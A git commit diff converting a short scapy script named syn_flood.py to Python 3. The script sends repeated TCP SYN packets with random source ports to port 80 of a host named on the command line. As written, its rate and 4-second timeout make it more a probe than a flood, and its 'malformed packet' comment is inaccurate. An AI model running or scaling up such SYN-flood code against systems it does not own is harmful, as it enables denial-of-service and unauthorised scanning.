34dfd2d66bf5ff43d4f6b5ad07aa7239572ee7be
Beatriz Galiana Carballido <beagaliana@riseup.net>
2020-01-12 15:52:21 +0100

    Modifications on the original script

--- syn_flood.py
+++ syn_flood.py
@@ -1,17 +1,19 @@
 import sys
 from scapy.all import *
 
-print "Field Values of packet sent"
-p=IP(dst=sys.argv[1],id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
+print("Field Values of packet sent")
+# Create malformed packet
+p=IP(dst=sys.argv[1],id=1111,ttl=99)/TCP(sport=RandShort(),dport=80,seq=12345,ack=1000,window=1000,flags="S")
 ls(p)
-print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
+print("Sending Packets in 0.3 second intervals for timeout of 4 sec")
 ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
-print "Summary of answered & unanswered packets"
+print("Summary of answered & unanswered packets")
 ans.summary()
+print("----------------------------------------")
+print("Summary of answered & unanswered packets")
 unans.summary()
-print "source port flags in response"
-#for s,r in ans:
-# print r.sprintf("%TCP.sport% \t %TCP.flags%")
-ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
+print("source port flags in response")
+for s,r in ans:
+    print(r.sprintf("%TCP.sport% \t %TCP.flags%"))
 
 
